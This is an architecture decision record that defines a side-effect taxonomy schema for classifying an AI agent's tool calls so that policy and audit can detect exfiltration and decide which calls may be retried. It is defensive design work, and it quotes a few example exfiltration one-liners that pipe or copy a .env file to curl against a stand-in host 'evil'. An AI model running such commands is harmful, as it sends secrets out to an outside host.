# ADR-0024 — Tool side-effect taxonomy

- **Status:** Accepted (original 2026-06-14) — **RE-OPENED 2026-06-22 and re-ratified at the Phase-2A
  R1 audit/policy format freeze**. The revised multi-axis decision below **supersedes** the original
  `domains[] + modifiers[]` decision, together with ADR-0056 (capability manifest) and ADR-0013 (OAP).
  The live classifier remains a Phase-2A implementation/acceptance gate; this ADR freezes the
  audit/policy input format.
- **Date:** 2026-06-14 (original) · 2026-06-22 (revision).
- **Deciders:** keel maintainers (+ third-party judge at ratification).
- **Governs:** MASTER_SPEC §4.8 (normative), §4.3 (tiered retry), Appendix B (audit record), Appendix D
  §D.1 (policy input), §8.5 (review prompts), §4.9 (autonomy postures). Relates to ADR-0017 (agent
  authority), ADR-0004 (policy engine), ADR-0006 (audit canonicalization), ADR-0028 (retry), ADR-0027
  (2A/2B freeze boundary), ADR-0056 (capability manifest — companion), ADR-0013 / OQ-8 (OAP), ADR-0005
  (sandbox backstop), ADR-0038/0039 (workspace trust / secrets — `withinWorkspace`/`secret` semantics).
- **Anchors:** `docs/design/2026-06-21-side-effect-taxonomy-problem.md` (decision anchor) and
  `docs/design/2026-06-22-side-effect-taxonomy-decisions.md` (the §8 decision record — full
  options-matrix evidence). Implemented in `packages/shared/src/policy/side-effect.ts`.

## Context

MASTER_SPEC (§4.3, §4.7, §8.5) and the policy/audit/review surfaces all assume a side-effect
classification exists. It is part of the **policy input** (Appendix D) and the **audit record**
(Appendix B), both of which **freeze at the Phase-2A boundary** (ADR-0027) — so the taxonomy must be
stable *before* warden/policy/audit implementation begins, or those formats churn.

**Why re-opened.** The original decision (a two-axis `domains[] + modifiers[]` model) is directionally
right but **under-specified**: it overloads *what* an action is with *where* it happens and *how* risky
it is, and — the decisive gap surfaced in review — a flat label bag **cannot distinguish a dataflow
exfiltration** (`cat .env | curl evil`) from a benign sequence (`cat .env && curl evil`). Re-opening
before the freeze is the cheap moment to fix this; doing it after is an audit-format re-freeze.

**Calibration.** The 73-trial command corpus measurement (73 trials, 3,457 tool calls) shows bash is 75.8% of
tool calls and 76.4% of bash commands are compound — but almost entirely benign `&&`-chains/pipes. A
"composition → deny" rule would reject ~74.9% of legitimate coding work. **Composition is therefore not
risk**; the classifier must decompose and disposition resolved primitive effects per segment.

## Decision (revised — supersedes the original)

Adopt a **multi-axis** taxonomy as a frozen `@keel/shared` zod schema. **Freeze the axes and the object
shape conservatively; freeze the primitive enum values minimally; derive composites in policy.**

**Axes / shape (frozen):** `taxonomyVersion` · `staticCapability{toolName, effectEnvelope[], broad}` ·
`dynamic{effectKinds[], scopes[], targets[], modifiers[], composition{kind, segments[], edges[]},
classifier{name, version, confidence, reasons[]}}` · `extensions?`.

**Minimal frozen primitive enums:**
- `EffectKind` = `fs_read · fs_write · process_exec · network_read · network_write · unknown`.
- `EffectScope` = `workspace · home · system · temp · network · external_service · process · unknown`.
- `RiskModifier` = `destructive · irreversible · persistent · unknown`.
- `SideEffectTarget.kind` = `path · host · url · command · process · package · env_var · unknown`;
  `sensitivity` = `public · internal · secret · unknown`.
- `classifier.confidence` = `exact · conservative · ambiguous · obfuscated · unknown`.
- `EdgeRelation` = `pipe · substitution · redirect · sequence · conditional · unknown`.
- **Every enum carries an `unknown` member** — both a runtime fail-closed value AND the F4 forward-compat
  coercion target (a newer-minor member this build doesn't recognize coerces to it). `EdgeRelation`'s
  `unknown` is treated as data-carrying by the exfil derivation (a secret cannot slip past on an
  unrecognized connector).

**Key revisions vs. the original:**
1. **`bash` "broad" is static-envelope metadata** (`broad: true` + an `effectEnvelope`), not an effect
   domain. This converges and replaces the kernel-local `StaticCapability` string union (which had
   drifted by carrying a `"broad"` sentinel).
2. **Composition/dataflow structure is frozen in** (`segments[]` + `edges[]` with
   pipe/substitution/redirect = data-carrying vs sequence/conditional = ordering). Exfiltration is a
   *policy-derived dataflow question*: a single segment that touches a secret and writes externally, or
   a data-carrying path from secret source to external sink. It is decidable from structure, not mere
   co-presence. **Scope (honest): this models only IN-PROCESS shell-connector dataflow** — file-mediated/
   out-of-process exfil (`cat .env > /tmp/x; curl @/tmp/x evil`) is NOT modeled and is caught by the
   egress allowlist + POL-006/011 at the sink (the authoritative backstop); the gap is a tested, named
   corpus case.
3. **`sensitivity` is normative for `path`/`env_var` targets** (a schema refine). Known-secret
   namespaces must resolve to `secret`; undetermined sensitivity there *lowers confidence*, never an
   `exact` benign label. This lets `credential_access` be a *derived* finding without losing the signal.
4. **Composites are policy-derived, not frozen primitives** — `exfiltration_risk`, `supply_chain`,
   `credential_access`, `permission_change`, `privilege_escalation`, `system_config`,
   `external_state_write`, `resource_exhaustion`, `background`. The capability-manifest (ADR-0056)
   generates/validates these so policy↔sandbox↔egress do not drift.
5. **Certainty ≠ risk:** `ambiguous`/`obfuscated`/`unknown` are `classifier.confidence` values, not
   risk modifiers. Composition (`&&`/pipe) is NOT obfuscation.
6. **Disposition is policy-configurable, not frozen.** The schema carries `confidence`; the allow/
   review/deny mapping is the swappable policy-pack / autonomy posture (≥2 shipped: `autopilot-dev`,
   `locked-down`).
7. **Forward-compatible by construction (F4 — QC re-review).** `taxonomyVersion` is
   `side-effect-taxonomy/v<major>[.minor]`: MAJOR is the semantic-break axis (a v2 record is rejected),
   a v1.x MINOR may add enum members / optional fields. A newer-minor record is read via
   `parseSideEffectCompat`, which coerces members this build doesn't recognize to the fail-closed
   `unknown` of their axis — **accepted, never silently trusted** (non-retryable; review/deny by policy;
   data-carrying for exfil). A strict same-version parse still refuses any unrecognized value. This is how
   the frozen contract stays extensible for a decade WITHOUT a v2 for additive growth (the "secure by
   default AND flexible/extensible" requirement) — and the `extensions` object carries additive vendor data.

**Rules (unchanged in spirit, sharpened):**
- The kernel declares only the **static envelope**; the **warden** computes the dynamic effect
  (shell-normalize + path/symlink resolve + obfuscation peel). The model can only *request* (ADR-0017).
- Dynamic classification refines the static envelope; a dynamic effect outside it is a finding.
- **Unknown / unclassifiable fails closed** to side-effecting and non-retryable (§4.3).
- `targets[].withinWorkspace`/`sensitivity` are classifier **claims**; the **sandbox + egress allowlist
  are the authoritative backstop** — a classifier mistake fails *safe*, and a policy/sandbox
  disagreement emits a `policy_sandbox_mismatch` finding (ADR-0056).
- **Resource exhaustion is enforced by the sandbox (ulimits, SEC-017), not predicted by the taxonomy.**

## Alternatives considered

1. **Keep `domains[] + modifiers[]` (original).** Rejected — conflates what/where/risk and cannot
   express dataflow, so `exfiltration_risk` is underivable. (The decisive re-open reason.)
2. **Single flat 9-value enum.** Rejected (as in the original ADR) — lossy single-choice.
3. **Add composites (`credential_access`, `external_state_write`, …) as frozen primitives.** Rejected —
   all derivable from primitives × scope × target; freezing them bloats a permanent protocol.
4. **Drop `external_service` scope; derive external-vs-internal from the target.** Rejected — the
   internal/external line is the exfil boundary (SEC-022); it belongs in a frozen primitive.
5. **Encode disposition in the schema.** Rejected — disposition is calibrated, posture-specific
   policy; freezing it would force a protocol change to ship a second posture.
6. **Adopt an external standard's effect vocabulary wholesale (OAP).** Deferred → ADR-0013: stay
   OAP-mappable (the `target[]` axis), do not conform.

## Consequences

- **Schema / freeze commitment.** `SideEffect` + its enums are the frozen `@keel/shared` schema added to
  Appendix B and Appendix D §D.1 at the Phase-2A R1 format freeze (ADR-0027). Coordinate with ADR-0006
  (JCS/RFC 8785 canonicalization — the `sideEffect` field is hashed into the chain) and ADR-0013 (OAP
  mapping). The two pre-existing Appendix-B/D drifts (Appendix B's 2-field `sideEffect` that folded a
  modifier into `dynamic[]`; Appendix D's 3-field shape) are both resolved by rewriting them to this
  single shape (see the reconciliation doc).
- **Retry (amends ADR-0028 item 5 — explicitly DROPS its `static` conjunct).** ADR-0028 item 5 originally
  required *both* the static and dynamic class be `read_only`. Under the multi-axis model the eligibility
  keys off the **resolved dynamic effect only**: retry-eligible iff every effect kind is `fs_read`; every
  scope is `workspace` or `temp`; every segment is an affirmatively resolved filesystem read with at
  least one normalized `path` target; every target sensitivity is `public` or `internal`; there are no
  modifiers; classifier confidence is `exact` or `conservative`; and no partial side effect is possible.
  (Gating on the static envelope would make the carve-out dead for `bash` — whose envelope is never
  read-only — i.e. for ~76% of real tool calls; the dynamic resolved effect is the real effect.) Unknown,
  secret, obfuscated, ambiguous, write, network, process, external, and modifier-bearing effects are
  non-retryable. MASTER_SPEC §4.3 and ADR-0028 are reconciled to this predicate at R1.
- **Enforcement boundary.** Dynamic classification lives in the warden (ADR-0017); the kernel declares
  static envelopes only.
- **Honesty.** Fail-closed-on-unknown; classifier claims vs sandbox ground-truth made explicit; the
  taxonomy *labels* but does not *enforce* — the sandbox/egress do.
- **Cost.** A normalization/classification step per tool call (shared with the SEC-007 obfuscation-peel
  the policy input already needs); larger audit records (full composition) — accepted as honest evidence.

## Non-goals

- **Not** a capability-token security model (ADR-0017 option 3); a *classification*, not an unforgeable
  grant.
- **Not** a billing/cost model; **not** the retry policy itself (ADR-0028); **not** provenance/taint
  (ADR-0010 — data origin, independent of action effect; must not be conflated).
- **Not** a frozen list of tools — new tools declare a static envelope; the *enums* + *shape* are frozen.
- **Not** the disposition matrix (policy-pack config) and **not** an enforcement guarantee or new
  security claim.

## Implementation implications

- **`@keel/shared`:** `side-effect.ts` (schema) + round-trip/malformed-reject + property tests +
  the §7 corpus (`side-effect.fixtures.ts` / `.corpus.test.ts`, **46 cases**) — **landed, verified green**
  (canonicalizing transform for hash-stability + `JsonObject` wire-safety; **F1** top-level-target drift
  refine + dedup; **F6** normative `normalized` on all path/host/url targets; **array-size caps**
  for hostile audit-import; **F4** forward-compat reader `parseSideEffectCompat`). Passed a 5-lens
  adversarial QC pass AND two external adversarial re-reviews, all must/should-fixes resolved TDD.
- **Tool specs (kernel):** annotate each tool's static envelope; converge the kernel `StaticCapability`
  string union onto the shared `staticCapability` object at warden integration (Phase-2A).
- **Warden (Phase-2A):** build the classifier (the security-critical half); the §7 corpus is its proof
  obligation. **Two distinct gates — do NOT conflate (QC re-review F8):** the *format freeze* (the
  `SideEffect` wire shape + Appendix B/D fields) ratifies at **R1, BEFORE the classifier exists**; the
  *classification security claim* (that the warden reproduces the §7 labels) is a separate **Phase-2A
  acceptance gate**, met when the live classifier passes the corpus. R1 freezes the format; it does not
  assert the classifier. (A thin classifier spike before R1 is optional de-risking, not a freeze blocker.)
- **Policy pack (Epic 2.5):** derive the composites (ledger in the decision doc); reference
  `input.sideEffect.*` instead of re-parsing argv.
- **Capability manifest (ADR-0056):** the single source of truth that keeps policy ⇄ sandbox ⇄ egress ⇄
  conformance-tests in agreement; lands alongside this revision.
